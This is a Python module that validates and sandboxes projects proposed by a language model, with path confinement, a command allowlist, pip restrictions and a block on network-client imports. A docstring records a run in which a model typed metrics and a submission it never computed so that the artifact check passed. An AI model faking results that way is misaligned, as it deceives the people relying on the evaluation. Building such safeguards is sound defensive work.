"""Task-agnostic generated-project contract and sandbox execution.

An LLM may propose files, Python commands, and expected artifacts. The proposal
is passive until this module validates it, binds every effect to the current
Practitioner, writes through the workspace service, and executes in an
immutable Docker image. No task type, dataset, domain, or solution is encoded
here.
"""
from __future__ import annotations

import ast
import hashlib
import json
import math
import mimetypes
import os
import re
from dataclasses import dataclass, field, replace
from functools import lru_cache
from pathlib import Path, PurePosixPath

from ..loop.effect_approval import (
    ApprovalDecision, EffectApprovalService)
from .runtime_observer import RuntimeObservationServices
from .generated_project_artifact_validation import verify_artifact_content
from .runtime_capacity import supplied_input_ceiling
from .workspace_backends import (
    CommandRequest, DockerResourceLimits, DockerWorkspace,
    DockerWorkspaceDeclaration, FileOperation, FileRequest,
    SnapshotRequest, WorkspaceOperationService, WorkspaceSpec)


DEFAULT_GENERATED_PROJECT_IMAGE = (
    "python@sha256:2407c61b1a18067393fecd8a22cf6fceede893b6aaca817bf9fbfe65e33614a3")
#: Operators name the sandbox image through the environment. The default is
#: a bare interpreter, which is the right floor for a runtime that must not
#: assume what a task needs — and the wrong ceiling for a machine asked to
#: do data work, where every attempt refuses honestly for want of a library
#: it is not allowed to install. Naming the image is how a deployment says
#: what its sandbox can do, rather than each task discovering it cannot.
SANDBOX_IMAGE_VARIABLE = "LOOP_ENGINE_SANDBOX_IMAGE"


def sandbox_image(environ=None) -> str:
    """The container image generated projects run in."""
    source = os.environ if environ is None else environ
    named = str(source.get(SANDBOX_IMAGE_VARIABLE, "") or "").strip()
    return named or DEFAULT_GENERATED_PROJECT_IMAGE


def selected_execution_backend(
        allow_local_execution: bool,
        image: "str | None" = None) -> str:
    """Name the backend a generated project would actually run in.

    Reported to the model as a runtime fact, so it must be decided the same
    way execution decides it: by asking whether Docker is available, not by
    reading the flag that only authorises the fallback. A run told it was a
    host process while its code ran in a container writes code for the wrong
    machine, and learns otherwise only from an import error.
    """
    if _docker_available(image or sandbox_image()):
        return "container"
    return "host_process" if allow_local_execution else "unavailable"


@lru_cache(maxsize=4)
def _docker_available(image: str) -> bool:
    """Whether Docker can run this image, asked once per process.

    The answer is a property of the machine rather than of a run, and every
    packet would otherwise pay for the same subprocess. Execution asks again
    for itself, so a stale yes costs a fallback rather than a wrong run.
    """
    declaration = DockerWorkspaceDeclaration(
        image=image,
        limits=DockerResourceLimits(memory="4g", cpus=2.0, pids=256,
                                    temporary_bytes=1024 * 1024 * 1024))
    spec = WorkspaceSpec(
        workspace_id="generated-availability-probe", root="/",
        backend_kind="docker", execution_enabled=True,
        allowed_commands=ALLOWED_PYTHON_EXECUTABLES)
    return bool(DockerWorkspace(spec, declaration).availability().available)
GENERATED_PROJECT_RECORD_TYPE = "generated_project_manifest/v1"
GENERATED_PROJECT_CANDIDATE_TYPE = "generated_project_candidate/v1"
ALLOWED_PYTHON_EXECUTABLES = (
    "python", "python3", ".venv/bin/python", ".venv/bin/python3")
GENERATED_COMMAND_KINDS = ("setup", "execute", "verify")
_PROJECT_ID = re.compile(r"^[a-z][a-z0-9_-]{0,79}$")


class GeneratedProjectError(ValueError):
    """A generated project or its execution violated the sandbox contract."""


def _relative_path(value: str) -> str:
    if not isinstance(value, str) or not value.strip():
        raise GeneratedProjectError("generated project path is empty")
    path = PurePosixPath(value.replace("\\", "/"))
    if (path.is_absolute() or ".." in path.parts or not path.parts
            or any(part.startswith(".") and part not in (".venv",)
                   for part in path.parts)):
        raise GeneratedProjectError(
            f"generated project path {value!r} is not confined")
    return path.as_posix()


@dataclass(frozen=True)
class GeneratedProjectFile:
    """One UTF-8 file proposed by the model."""

    path: str
    content: str

    def __post_init__(self) -> None:
        object.__setattr__(self, "path", _relative_path(self.path))
        if not isinstance(self.content, str):
            raise GeneratedProjectError("generated file content must be text")

    def to_dict(self) -> dict:
        return {"path": self.path, "content": self.content}


#: Sanity bound for one generated command, not a work ceiling: a timeout the
#: model proposes must be a finite number the sandbox can actually enforce.
MAXIMUM_COMMAND_TIMEOUT_SECONDS = 24 * 60 * 60
#: pip options a generated setup command may use; everything that changes
#: where packages come from (index and link URLs, local paths) is refused.
ALLOWED_PIP_OPTIONS = frozenset({
    "--no-cache-dir", "--quiet", "-q", "--upgrade", "-U", "--no-deps",
    "--prefer-binary", "--disable-pip-version-check", "--no-input",
    "-r", "--requirement"})


@dataclass(frozen=True)
class GeneratedProjectCommand:
    """One argv-only Python command with a purpose and timeout."""

    argv: tuple[str, ...]
    purpose: str
    timeout_seconds: float = 300.0
    command_kind: str = "execute"
    network_access: bool = False
    expected_exit_codes: tuple[int, ...] = (0,)

    def __post_init__(self) -> None:
        argv = tuple(self.argv)
        if (not argv or any(not isinstance(item, str) or not item
                            for item in argv)):
            raise GeneratedProjectError(
                "generated project command needs non-empty argv")
        if argv[0] not in ALLOWED_PYTHON_EXECUTABLES:
            raise GeneratedProjectError(
                "generated commands must use the registered Python executable")
        if any(item in ("-c", "--command") for item in argv[1:]):
            raise GeneratedProjectError(
                "generated commands must execute reviewed files, not inline code")
        if not self.purpose.strip() or self.timeout_seconds <= 0:
            raise GeneratedProjectError(
                "generated command needs a purpose and positive timeout")
        timeout = float(self.timeout_seconds)
        if (isinstance(self.timeout_seconds, bool)
                or timeout != timeout or timeout in (float("inf"), float("-inf"))
                or timeout > MAXIMUM_COMMAND_TIMEOUT_SECONDS):
            raise GeneratedProjectError(
                "generated command timeout must be a finite number of seconds "
                f"no greater than {MAXIMUM_COMMAND_TIMEOUT_SECONDS}")
        if self.command_kind not in GENERATED_COMMAND_KINDS:
            raise GeneratedProjectError(
                "generated command kind must be setup, execute, or verify")
        if self.network_access and (
                self.command_kind != "setup"
                or tuple(argv[1:4]) != ("-m", "pip", "install")):
            raise GeneratedProjectError(
                "network access is limited to python -m pip install setup")
        if self.network_access:
            for item in argv[4:]:
                if ((item.startswith("-") and item not in ALLOWED_PIP_OPTIONS)
                        or "://" in item or item.startswith("/")
                        or item.startswith(".")):
                    raise GeneratedProjectError(
                        "pip install arguments are limited to requirement "
                        "specifiers and the reviewed options "
                        f"{sorted(ALLOWED_PIP_OPTIONS)}; index URLs, links, "
                        "paths, and URLs are refused")
        expected = tuple(self.expected_exit_codes)
        if (not expected
                or any(not isinstance(item, int) or isinstance(item, bool)
                       or item < 0 or item > 255 for item in expected)
                or len(expected) != len(set(expected))):
            raise GeneratedProjectError(
                "expected exit codes must be unique integers from 0 through 255")
        object.__setattr__(self, "argv", argv)
        object.__setattr__(self, "expected_exit_codes", expected)

    def to_dict(self) -> dict:
        return {
            "argv": list(self.argv),
            "purpose": self.purpose,
            "timeout_seconds": self.timeout_seconds,
            "command_kind": self.command_kind,
            "network_access": self.network_access,
            "expected_exit_codes": list(self.expected_exit_codes),
        }


@dataclass(frozen=True)
class ExpectedProjectArtifact:
    """One file whose presence and minimum size are acceptance evidence."""

    path: str
    media_type: str
    minimum_bytes: int = 1

    def __post_init__(self) -> None:
        object.__setattr__(self, "path", _relative_path(self.path))
        if not self.media_type.strip() or self.minimum_bytes != 1:
            raise GeneratedProjectError(
                "generated artifact minimum_bytes must be the framework "
                "nonempty value 1; a model cannot invent acceptance thresholds")

    def to_dict(self) -> dict:
        return {
            "path": self.path,
            "media_type": self.media_type,
            "minimum_bytes": self.minimum_bytes,
        }


@dataclass(frozen=True)
class GeneratedProjectFileSpec:
    """One file requested by a passive project candidate."""

    path: str
    purpose: str
    acceptance: tuple[str, ...] = ()

    def __post_init__(self) -> None:
        object.__setattr__(self, "path", _relative_path(self.path))
        acceptance = tuple(self.acceptance)
        if (not self.purpose.strip()
                or any(not isinstance(item, str) or not item.strip()
                       for item in acceptance)):
            raise GeneratedProjectError("generated file specification is invalid")
        object.__setattr__(self, "acceptance", acceptance)

    def to_dict(self) -> dict:
        return {
            "path": self.path, "purpose": self.purpose,
            "acceptance": list(self.acceptance),
        }


def _refuse_pre_authored_artifacts(file_paths, artifacts) -> None:
    """An expected artifact is evidence of a run, so it may not be typed.

    A file written from the candidate proves only that a model typed it. When
    the same path is also declared an expected artifact, the artifact check
    becomes vacuous: the bytes were there before any command ran, so a crashed
    or never-executed solution still "produces" its outputs.

    A live run failed exactly this way. It declared submission.csv,
    metrics.json, report.md and verification.json as both authored files and
    expected artifacts, then typed cross-validation scores it had never
    computed and a submission it had never predicted, and the artifact check
    passed on all four. Authored files remain fully evidenced by the write
    record; they simply do not count as the output of an execution.
    """
    positions = {path: index for index, path in enumerate(file_paths)}
    overlaps = [(index, positions[item.path]) for index, item in enumerate(artifacts)
                if item.path in positions]
    if overlaps:
        fields = ", ".join(f"expected_artifacts[{output}].path=files[{source}].path"
                           for output, source in overlaps[:8])
        raise GeneratedProjectError(
            f"{fields}: authored_artifact_overlap; declared as expected artifacts and also authored "
            "as project files; an expected artifact is evidence that a "
            "command produced it, and a typed file proves only that it was "
            "typed. Author the code that produces each of these and remove "
            "the output itself from files, or drop it from expected_artifacts "
            "if it is an input rather than a result")


def _require_project_work(files, commands, artifacts, *, prefix: str) -> None:
    if not files:
        raise GeneratedProjectError(f"{prefix}.files: empty_array")
    if not commands:
        raise GeneratedProjectError(f"{prefix}.commands: empty_array")
    if not artifacts and not any(
            item.command_kind == "verify" and item.expected_exit_codes == (0,)
            for item in commands):
        raise GeneratedProjectError(
            f"{prefix}.commands: code_only_requires_zero_exit_verify_command")


def _project_mapping_parts(value: object, *, candidate: bool) -> dict:
    """Validate schema positions before constructing objects, without coercion."""
    prefix = "candidate" if candidate else "manifest"

    def fields(item, required, optional, location):
        if type(item) is not dict:
            raise GeneratedProjectError(f"{location}: expected_object")
        missing = required - set(item)
        if missing:
            raise GeneratedProjectError(
                f"{location}: missing_fields=" + ",".join(sorted(missing)))
        extra = set(item) - required - optional
        if extra:
            raise GeneratedProjectError(f"{location}: unexpected_fields_count={len(extra)}")

    def text(item, location, *, empty=False):
        if type(item) is not str:
            raise GeneratedProjectError(f"{location}: expected_text")
        if not empty and not item.strip():
            raise GeneratedProjectError(f"{location}: empty_text")
        try:
            item.encode("utf-8")
        except UnicodeError:
            raise GeneratedProjectError(f"{location}: invalid_utf8_text") from None
        return item

    def array(item, location, *, nonempty=False):
        if type(item) is not list:
            raise GeneratedProjectError(f"{location}: expected_array")
        if nonempty and not item:
            raise GeneratedProjectError(f"{location}: empty_array")
        return item

    def construct(factory, location, **parts):
        try:
            return factory(**parts)
        except (ValueError, TypeError, OverflowError):
            raise GeneratedProjectError(f"{location}: invalid_value") from None

    required = {"record_type", "project_id", "summary", "files", "commands", "expected_artifacts"}
    fields(value, required, set(), prefix)
    result = {name: text(value[name], f"{prefix}.{name}")
              for name in ("record_type", "project_id", "summary")}
    expected_type = GENERATED_PROJECT_CANDIDATE_TYPE if candidate else GENERATED_PROJECT_RECORD_TYPE
    if result["record_type"] != expected_type:
        raise GeneratedProjectError(f"{prefix}.record_type: unsupported_value")
    if not _PROJECT_ID.fullmatch(result["project_id"]):
        raise GeneratedProjectError(f"{prefix}.project_id: invalid_value")
    files = []
    for index, item in enumerate(array(value["files"], f"{prefix}.files", nonempty=True)):
        location = f"{prefix}.files[{index}]"
        fields(item, {"path", "purpose"} if candidate else {"path", "content"},
               {"acceptance"} if candidate else set(), location)
        path = text(item["path"], location + ".path")
        if candidate:
            acceptance = array(item.get("acceptance", []), location + ".acceptance")
            files.append(construct(GeneratedProjectFileSpec, location, path=path,
                purpose=text(item["purpose"], location + ".purpose"),
                acceptance=tuple(text(entry, f"{location}.acceptance[{i}]")
                                 for i, entry in enumerate(acceptance))))
        else:
            files.append(construct(GeneratedProjectFile, location, path=path,
                content=text(item["content"], location + ".content", empty=True)))
    commands = []
    for index, item in enumerate(array(value["commands"], f"{prefix}.commands", nonempty=True)):
        location = f"{prefix}.commands[{index}]"
        fields(item, {"argv", "purpose"}, {"timeout_seconds", "command_kind",
               "network_access", "expected_exit_codes"}, location)
        argv = array(item["argv"], location + ".argv", nonempty=True)
        arguments = tuple(text(arg, f"{location}.argv[{i}]", empty=True)
                          for i, arg in enumerate(argv))
        for i, arg in enumerate(arguments):
            if not arg:
                raise GeneratedProjectError(f"{location}.argv[{i}]: empty_text")
        timeout = item.get("timeout_seconds", 300.0)
        if type(timeout) not in (int, float):
            raise GeneratedProjectError(f"{location}.timeout_seconds: expected_finite_number")
        try:
            finite = math.isfinite(timeout)
        except OverflowError:
            finite = False
        if not finite or not 0 < timeout <= MAXIMUM_COMMAND_TIMEOUT_SECONDS:
            raise GeneratedProjectError(f"{location}.timeout_seconds: invalid_value")
        network = item.get("network_access", False)
        if type(network) is not bool:
            raise GeneratedProjectError(f"{location}.network_access: expected_boolean")
        codes = array(item.get("expected_exit_codes", [0]),
                      location + ".expected_exit_codes", nonempty=True)
        for i, code in enumerate(codes):
            if type(code) is not int:
                raise GeneratedProjectError(f"{location}.expected_exit_codes[{i}]: expected_integer")
        commands.append(construct(GeneratedProjectCommand, location, argv=arguments,
            purpose=text(item["purpose"], location + ".purpose"), timeout_seconds=timeout,
            command_kind=text(item.get("command_kind", "execute"), location + ".command_kind"),
            network_access=network, expected_exit_codes=tuple(codes)))
    artifacts = []
    for index, item in enumerate(array(value["expected_artifacts"], f"{prefix}.expected_artifacts")):
        location = f"{prefix}.expected_artifacts[{index}]"
        fields(item, {"path", "media_type"}, {"minimum_bytes"}, location)
        minimum = item.get("minimum_bytes", 1)
        if type(minimum) is not int or minimum != 1:
            raise GeneratedProjectError(f"{location}.minimum_bytes: expected_framework_value_1")
        artifacts.append(construct(ExpectedProjectArtifact, location,
            path=text(item["path"], location + ".path"),
            media_type=text(item["media_type"], location + ".media_type"), minimum_bytes=minimum))
    return {**result, "files": tuple(files), "commands": tuple(commands),
            "expected_artifacts": tuple(artifacts)}


@dataclass(frozen=True)
class GeneratedProjectCandidate:
    """Passive project structure compiled into files before any effect."""

    project_id: str
    summary: str
    files: tuple[GeneratedProjectFileSpec, ...]
    commands: tuple[GeneratedProjectCommand, ...]
    expected_artifacts: tuple[ExpectedProjectArtifact, ...]
    record_type: str = GENERATED_PROJECT_CANDIDATE_TYPE

    def __post_init__(self) -> None:
        if self.record_type != GENERATED_PROJECT_CANDIDATE_TYPE:
            raise GeneratedProjectError("project candidate record type is invalid")
        if not _PROJECT_ID.fullmatch(self.project_id):
            raise GeneratedProjectError("project candidate project_id is invalid")
        files = tuple(self.files)
        commands = tuple(self.commands)
        artifacts = tuple(self.expected_artifacts)
        if not self.summary.strip():
            raise GeneratedProjectError("candidate.summary: empty_text")
        _require_project_work(files, commands, artifacts, prefix="candidate")
        paths = tuple(item.path for item in files)
        if len(paths) != len(set(paths)):
            raise GeneratedProjectError("project candidate file paths repeat")
        _refuse_pre_authored_artifacts(paths, artifacts)
        object.__setattr__(self, "files", files)
        object.__setattr__(self, "commands", commands)
        object.__setattr__(self, "expected_artifacts", artifacts)

    @classmethod
    def from_mapping(cls, value: object) -> "GeneratedProjectCandidate":
        return cls(**_project_mapping_parts(value, candidate=True))

    def to_dict(self) -> dict:
        return {
            "record_type": self.record_type,
            "project_id": self.project_id,
            "summary": self.summary,
            "files": [item.to_dict() for item in self.files],
            "commands": [item.to_dict() for item in self.commands],
            "expected_artifacts": [
                item.to_dict() for item in self.expected_artifacts],
        }


@dataclass(frozen=True)
class GeneratedProjectInputArtifact:
    """One immutable researched input copied into the confined workspace."""

    path: str
    content: bytes = field(repr=False, compare=False)
    media_type: str = "application/octet-stream"
    digest: str = ""

    def __post_init__(self) -> None:
        object.__setattr__(self, "path", _relative_path(self.path))
        if not isinstance(self.content, bytes):
            raise GeneratedProjectError("project input artifact content must be bytes")
        observed = hashlib.sha256(self.content).hexdigest()
        if self.digest and self.digest != observed:
            raise GeneratedProjectError("project input artifact digest changed")
        if not self.media_type.strip():
            raise GeneratedProjectError("project input artifact needs media_type")
        object.__setattr__(self, "digest", observed)

    def to_dict(self) -> dict:
        return {
            "path": self.path, "media_type": self.media_type,
            "digest": self.digest, "byte_count": len(self.content),
        }


@dataclass(frozen=True)
class GeneratedProjectManifest:
    """Complete model proposal for one bounded executable project."""

    project_id: str
    summary: str
    files: tuple[GeneratedProjectFile, ...]
    commands: tuple[GeneratedProjectCommand, ...]
    expected_artifacts: tuple[ExpectedProjectArtifact, ...]
    record_type: str = GENERATED_PROJECT_RECORD_TYPE

    def __post_init__(self) -> None:
        if self.record_type != GENERATED_PROJECT_RECORD_TYPE:
            raise GeneratedProjectError("generated project record type is invalid")
        if not _PROJECT_ID.fullmatch(self.project_id):
            raise GeneratedProjectError("generated project_id is invalid")
        if not self.summary.strip():
            raise GeneratedProjectError("generated project summary is empty")
        files = tuple(self.files)
        commands = tuple(self.commands)
        artifacts = tuple(self.expected_artifacts)
        _require_project_work(files, commands, artifacts, prefix="manifest")
        paths = tuple(item.path for item in files)
        if len(paths) != len(set(paths)):
            raise GeneratedProjectError("generated project file paths repeat")
        _refuse_pre_authored_artifacts(paths, artifacts)
        object.__setattr__(self, "files", files)
        object.__setattr__(self, "commands", commands)
        object.__setattr__(self, "expected_artifacts", artifacts)

    @classmethod
    def from_mapping(cls, value: object) -> "GeneratedProjectManifest":
        return cls(**_project_mapping_parts(value, candidate=False))

    @property
    def digest(self) -> str:
        body = json.dumps(
            self.to_dict(), sort_keys=True, separators=(",", ":"),
            ensure_ascii=False)
        return hashlib.sha256(body.encode("utf-8")).hexdigest()

    def to_dict(self) -> dict:
        return {
            "record_type": self.record_type,
            "project_id": self.project_id,
            "summary": self.summary,
            "files": [item.to_dict() for item in self.files],
            "commands": [item.to_dict() for item in self.commands],
            "expected_artifacts": [
                item.to_dict() for item in self.expected_artifacts],
        }


@dataclass(frozen=True)
class GeneratedProjectAuthority:
    """Exact user-granted boundaries for one task-build invocation."""

    actor_id: str
    allow_workspace_writes: bool
    allow_sandbox_commands: bool
    allow_network_reads: bool
    #: Host execution when Docker is absent. Off by default: a host process
    #: has no operating-system sandbox, so the caller must ask for it.
    allow_local_execution: bool = False

    def __post_init__(self) -> None:
        if not self.actor_id.strip():
            raise GeneratedProjectError("project authority needs actor_id")


@dataclass(frozen=True)
class GeneratedProjectExecutionRequest:
    """Manifest, workspace, and immutable container for one attempt."""

    manifest: GeneratedProjectManifest
    workspace_root: str
    authority: GeneratedProjectAuthority
    image: str = DEFAULT_GENERATED_PROJECT_IMAGE
    input_artifacts: tuple[GeneratedProjectInputArtifact, ...] = ()

    def __post_init__(self) -> None:
        if not isinstance(self.manifest, GeneratedProjectManifest):
            raise GeneratedProjectError("execution request needs a manifest")
        if not self.workspace_root.strip():
            raise GeneratedProjectError("execution request needs workspace_root")
        if not isinstance(self.authority, GeneratedProjectAuthority):
            raise GeneratedProjectError("execution request needs authority")
        inputs = tuple(self.input_artifacts)
        if (any(not isinstance(item, GeneratedProjectInputArtifact)
                       for item in inputs)
                or len({item.path for item in inputs}) != len(inputs)):
            raise GeneratedProjectError(
                "project input artifacts must be unique")
        object.__setattr__(self, "input_artifacts", inputs)
        validate_generated_project_input_paths(self.manifest, inputs)


@dataclass(frozen=True)
class GeneratedProjectExecutionContext:
    """Current Practitioner identity and event log for project effects."""

    parent_loop: object

    def __post_init__(self) -> None:
        if (self.parent_loop is None
                or not getattr(self.parent_loop, "loop_id", "")
                or getattr(self.parent_loop, "ledger", None) is None):
            raise GeneratedProjectError(
                "generated project execution needs an active parent Loop")


#: A workspace must be able to hold what the runtime already admitted as an
#: input. The floor is what a model-authored file may reach; a file the model
#: typed that is larger than this is pathological, not a deliverable. The
#: limit then grows to the largest supplied input, because refusing to place a
#: file the runtime itself chose to supply is the runtime contradicting its own
#: decision. A live run against a real competition placed only its 7.7 MB
#: submission template and refused its 44.7 MB training rows against a flat
#: 16 MB cap, so no amount of model reasoning could have produced a result.
GENERATED_FILE_BYTE_FLOOR = 16 * 1024 * 1024

def supplied_input_ceiling_bytes(workspace_root=None) -> "int | None":
    """The largest single input this machine can materialize, or None.

    Measured, never declared. The first repair of the flat sixteen-megabyte
    cap replaced it with a larger flat number, which is the same defect one
    order of magnitude out: it would refuse the next bigger dataset for no
    reason the machine could point at. None means neither memory nor disk
    could be read, and nothing is refused on a guess.
    """
    return supplied_input_ceiling(workspace_root)["bytes"]


def workspace_file_byte_limit(
        inputs: "tuple[GeneratedProjectInputArtifact, ...]" = ()) -> int:
    """The file size this workspace must admit for these inputs."""
    return max(GENERATED_FILE_BYTE_FLOOR,
               max((len(item.content) for item in inputs), default=0))


def validate_generated_project_input_paths(project, inputs) -> None:
    """Refuse authored paths that overwrite or structurally block an input.

    This effect-free check accepts candidate specifications or a complete
    manifest. Supplied inputs keep their admitted names; generated outputs
    must use distinct paths rather than an overwrite permission.
    """
    for file_index, authored in enumerate(project.files):
        authored_path = PurePosixPath(authored.path)
        for input_index, supplied in enumerate(inputs):
            input_path = PurePosixPath(supplied.path)
            if (authored_path == input_path
                    or authored_path in input_path.parents
                    or input_path in authored_path.parents):
                raise GeneratedProjectError(
                    f"files[{file_index}].path collides with "
                    f"input_artifacts[{input_index}].path; supplied inputs "
                    "are read-only source material. Choose distinct authored "
                    "and output paths; do not recreate or overwrite inputs")


def validate_generated_project_input_use(
        manifest: GeneratedProjectManifest,
        inputs: tuple[GeneratedProjectInputArtifact, ...]) -> dict:
    """Screen static bindings, never certify that an input was consumed.

    Computed paths, helpers and control flow are unresolved, not evidence of
    an absent input. Only simple direct mismatches or trivial no-input code
    are rejected here. Sandbox policy, approvals and independent evaluation
    remain separate requirements for every project admitted by this screen.
    """
    if not isinstance(manifest, GeneratedProjectManifest):
        raise GeneratedProjectError("input-use validation needs a manifest")
    supplied = tuple(inputs)
    if any(not isinstance(item, GeneratedProjectInputArtifact) for item in supplied):
        raise GeneratedProjectError("input-use validation needs typed input artifacts")
    supplied_paths = {item.path for item in supplied}
    generated_paths = {item.path for item in manifest.files}
    referenced = set()
    forbidden_imports = set()
    near_misses: set[tuple[str, str]] = set()
    reader_seen = False
    unresolved = False
    indirect = not any(item.path.endswith(".py") for item in manifest.files)
    network_roots = {
        "aiohttp", "ftplib", "http.client", "httpx", "requests", "socket",
        "urllib", "urllib3"}
    read_methods = {"read_text", "read_bytes", "read", "readline", "readlines"}
    read_functions = {"open", "read_csv", "read_table", "read_json",
                      "read_parquet", "read_excel", "load", "copy", "copy2",
                      "copyfile", "copytree"}

    def call_name(node):
        return (node.id if isinstance(node, ast.Name) else
                node.attr if isinstance(node, ast.Attribute) else "")

    def literal_path(node):
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value
        if (isinstance(node, ast.Call) and call_name(node.func) in ("Path", "open")
                and len(node.args) == 1 and not node.keywords):
            return literal_path(node.args[0])
        return None

    def note_read(value):
        nonlocal unresolved
        if value is None:
            unresolved = True
            return
        value = PurePosixPath(value).as_posix()
        if value in generated_paths:
            # Reading a generated requirements file or module is not a bad
            # reference to an original source with the same basename.
            unresolved = True
        elif value in supplied_paths:
            referenced.add(value)
        else:
            matches = {path for path in supplied_paths
                       if path.endswith("/" + value)
                       or PurePosixPath(path).name == PurePosixPath(value).name}
            near_misses.update((value, path) for path in matches)
            if not matches:
                unresolved = True

    for item in manifest.files:
        if not item.path.endswith(".py"):
            continue
        try:
            tree = ast.parse(item.content)
        except SyntaxError as exc:
            raise GeneratedProjectError(
                f"generated Python file {item.path!r} does not parse") from exc
        for node in ast.walk(tree):
            if isinstance(node, (ast.If, ast.For, ast.While, ast.Try,
                                 ast.FunctionDef, ast.AsyncFunctionDef,
                                 ast.ClassDef, ast.Lambda, ast.With, ast.AsyncWith)):
                indirect = True
            if isinstance(node, ast.Call):
                name = call_name(node.func)
                if name == "open":
                    is_path_method = (isinstance(node.func, ast.Attribute)
                                      and isinstance(node.func.value, ast.Call)
                                      and call_name(node.func.value.func) == "Path")
                    operand = (node.func.value if is_path_method else
                               node.args[0] if node.args else None)
                    mode_position = 0 if is_path_method else 1
                    mode_node = next((item.value for item in node.keywords
                                      if item.arg == "mode"), None)
                    if mode_node is None and len(node.args) > mode_position:
                        mode_node = node.args[mode_position]
                    mode = "r" if mode_node is None else literal_path(mode_node)
                    if mode not in ("r", "rt", "rb"):
                        # Write/update modes are not read evidence. An unknown
                        # mode or user-defined open method is unresolved too.
                        indirect = True
                        continue
                    if isinstance(node.func, ast.Attribute) and not is_path_method:
                        indirect = True
                    reader_seen = True
                    note_read(literal_path(operand))
                elif name in read_methods and isinstance(node.func, ast.Attribute):
                    reader_seen = True
                    note_read(literal_path(node.func.value))
                elif name in read_functions:
                    reader_seen = True
                    note_read(literal_path(node.args[0]) if node.args else None)
                elif name == "Path":
                    indirect = indirect or literal_path(node) is None
                elif name != "print" or any(not isinstance(arg, ast.Constant)
                                           for arg in node.args) or node.keywords:
                    indirect = True
            names = []
            if isinstance(node, ast.Import):
                names = [entry.name for entry in node.names]
            elif isinstance(node, ast.ImportFrom) and node.module:
                names = [node.module]
            for name in names:
                if name not in ("__future__", "pathlib"):
                    indirect = True
                if any(name == root or name.startswith(root + ".")
                       for root in network_roots):
                    forbidden_imports.add(name)
    for command in manifest.commands:
        for argument in command.argv:
            if argument in supplied_paths:
                referenced.add(argument)
                unresolved = True  # argv binding does not prove the program reads it
    if forbidden_imports:
        raise GeneratedProjectError(
            "offline execute or verify source imports network clients: "
            + ", ".join(sorted(forbidden_imports)))
    if supplied and near_misses and not indirect and not unresolved:
        detail = ", ".join(f"{value!r} differs from supplied {path!r}"
                           for value, path in sorted(near_misses)[:6])
        raise GeneratedProjectError("simple direct input binding mismatch: " + detail)
    if supplied and not reader_seen and not indirect and not unresolved:
        raise GeneratedProjectError(
            "trivial generated program has no input operation; documentation "
            "or literal mentions are not input-consumption evidence")
    assessment = ("not_applicable" if not supplied else "unresolved"
                  if indirect or unresolved or not referenced else "static_binding_match")
    return {
        "record_type": "generated_project_input_use_validation/v1",
        "supplied_paths": [item.path for item in supplied],
        "referenced_paths": sorted(referenced),
        "offline_network_imports": [],
        "scope": "static_binding_screen_only",
        "assessment": assessment,
        "runtime_use_verified": False,
        "task_acceptance": "not_evaluated",
        "verification_required": "sandbox execution and independent evaluator",
        "unresolved_path_candidates": [
            {"literal": value, "supplied_path": path}
            for value, path in sorted(near_misses)[:16]],
        "passed": True,
    }


def _approve_exact(operations, plan, authority) -> str:
    is_command = isinstance(plan.request, CommandRequest)
    permitted = (authority.allow_sandbox_commands if is_command
                 else authority.allow_workspace_writes)
    if not permitted:
        raise PermissionError(
            "task-build authority does not permit this generated project effect")
    approvals = operations.approvals
    if approvals is None:
        raise GeneratedProjectError("workspace operation has no approval service")
    checkpoint = approvals.create(plan.approval)
    approvals.resume(
        checkpoint.pending, checkpoint.resume_token,
        ApprovalDecision.approve(
            plan.approval.request_id, authority.actor_id,
            reason="User invoked task build for this confined project."))
    return plan.approval.request_id


def _authored_source_artifacts(manifest, operations, commands) -> list[dict]:
    """Expose authored deliverables without pretending commands produced them."""
    verified_run = bool(
        len(commands) == len(manifest.commands)
        and all(item.get("ok") is True and item.get("exit_code") == 0
                and item.get("expectation_met") is True for item in commands)
        and any(item.get("command_kind") == "verify" for item in commands))
    records = []
    for file in manifest.files:
        result = operations.file(FileRequest(FileOperation.READ, file.path))
        expected_digest = hashlib.sha256(file.content.encode("utf-8")).hexdigest()
        observed_digest = hashlib.sha256(result.content).hexdigest() if result.ok else ""
        digest_matches = (result.ok and observed_digest == expected_digest
                          and result.digest == observed_digest)
        media_type = mimetypes.guess_type(file.path)[0] or "text/plain"
        format_valid, method, error = False, "source_read", "source_unavailable"
        if result.ok:
            if file.path.endswith(".py"):
                method = "python_syntax"
                try:
                    ast.parse(result.content.decode("utf-8"))
                    format_valid, error = True, ""
                except (SyntaxError, UnicodeError, ValueError, RecursionError):
                    error = "python_source_syntax_invalid"
            elif not result.content and media_type.startswith("text/") and media_type != "text/html":
                format_valid, method, error = True, "utf8_decode", ""
            else:
                format_valid, method, error = verify_artifact_content(media_type, result.content)
        records.append({
            "path": file.path, "media_type": media_type,
            "artifact_origin": "authored_source", "command_produced": False,
            "present": result.ok, "byte_count": len(result.content) if result.ok else result.byte_count,
            "digest": observed_digest, "expected_source_digest": expected_digest,
            "source_digest_matches": bool(digest_matches),
            "format_valid": format_valid, "format_error": error,
            "error_code": result.error_code,
            "verification_method": "post_run_authored_digest_" + method + "_and_verify_command",
            "verification_command_passed": verified_run,
            "verified": bool(verified_run and digest_matches and format_valid),
        })
    if any(not item["source_digest_matches"] or not item["format_valid"] for item in records):
        for item in records:
            item["verified"] = False
    return records


def execute_generated_project(
        request: GeneratedProjectExecutionRequest,
        context: GeneratedProjectExecutionContext) -> dict:
    """Validate, write, run, and inspect one generated project attempt.

    Backend selection prefers the full Docker OS sandbox. When the Docker
    command is absent and the authority explicitly allows local execution,
    execution falls back to the restricted local backend
    with the same file boundary, command allowlist, and exact per-effect
    approvals. The local fallback refuses dependency-network commands
    because a host process is not an operating-system sandbox, so the
    network-policy rule stays stronger, not weaker.
    """
    # Repeat at the effect boundary, even if a caller bypassed construction.
    validate_generated_project_input_paths(request.manifest, request.input_artifacts)
    root = Path(request.workspace_root).expanduser().resolve()
    root.mkdir(parents=True, exist_ok=True)
    parent = context.parent_loop
    runtime = RuntimeObservationServices(parent=parent, ledger=parent.ledger)
    approvals = EffectApprovalService(runtime=runtime)
    declaration = DockerWorkspaceDeclaration(
            image=request.image,
            limits=DockerResourceLimits(
                memory="4g", cpus=2.0, pids=256,
                temporary_bytes=1024 * 1024 * 1024))

    file_byte_limit = workspace_file_byte_limit(request.input_artifacts)
    docker_spec = WorkspaceSpec(
        workspace_id=f"generated-{request.manifest.project_id}",
        root=str(root), backend_kind="docker", execution_enabled=True,
        allowed_commands=ALLOWED_PYTHON_EXECUTABLES,
        max_file_bytes=file_byte_limit)
    docker_backend = DockerWorkspace(docker_spec, declaration)
